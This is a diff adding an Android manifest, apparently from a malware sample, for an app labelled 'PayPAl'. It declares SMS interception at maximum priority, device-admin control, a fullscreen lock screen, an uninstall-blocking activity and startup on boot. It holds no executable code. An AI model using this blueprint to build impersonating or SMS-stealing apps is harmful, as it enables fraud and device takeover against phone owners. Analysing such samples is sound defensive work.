@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" package="com.elite">
+	<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="19" />
+	<uses-permission android:name="android.permission.GET_TASKS" />
+	<uses-permission android:name="android.permission.READ_PHONE_STATE" />
+	<uses-permission android:name="android.permission.RECEIVE_SMS" />
+	<uses-permission android:name="android.permission.SEND_SMS" />
+	<uses-permission android:name="android.permission.READ_SMS" />
+	<uses-permission android:name="android.permission.WRITE_SMS" />
+	<uses-permission android:name="android.permission.READ_CONTACTS" />
+	<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+	<uses-permission android:name="android.permission.WRITE_SETTINGS" />
+	<uses-permission android:name="android.permission.WAKE_LOCK" />
+	<application android:label="PayPAl" android:icon="res/drawable/elite_logo.png" android:manageSpaceActivity="com.elite.LockScreen" android:debuggable="true" android:allowBackup="true">
+		<activity android:label="PayPAl" android:name="com.elite.MainActivity" android:excludeFromRecents="true" android:configChanges="0x4a0">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>
+		</activity>
+		<activity android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" android:label="PayPAl" android:name="com.elite.LockScreen" android:configChanges="0x4a0" android:noHistory="true" />
+		<activity android:theme="resourceId:0x7f090002" android:label="PayPAl" android:name="com.elite.UninstallAdminDevice" android:launchMode="singleTop" android:configChanges="0x4a0">
+			<intent-filter>
+				<action android:name="android.intent.action.SEND" />
+				<category android:name="android.intent.category.DEFAULT" />
+			</intent-filter>
+		</activity>
+		<service android:name="com.elite.IntentServiceClass" />
+		<receiver android:label="PayPAl" android:name="com.elite.AdminReciever" android:permission="android.permission.BIND_DEVICE_ADMIN" android:description="Elite: A parent&apos;s care for child.">
+			<meta-data android:name="android.app.device_admin" android:resource="res/xml/device_admin_sample.xml" />
+			<intent-filter>
+				<action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+			</intent-filter>
+		</receiver>
+		<receiver android:name="com.elite.SMSReceiver">
+			<intent-filter android:priority="2147483647">
+				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+			</intent-filter>
+		</receiver>
+		<receiver android:name="com.elite.BootReceiver" android:enabled="true">
+			<intent-filter>
+				<action android:name="android.intent.action.BOOT_COMPLETED" />
+				<category android:name="android.intent.category.DEFAULT" />
+			</intent-filter>
+		</receiver>
+		<receiver android:name="com.elite.AlarmReceiver" android:enabled="true" android:process=":remote" />
+	</application>
+</manifest>
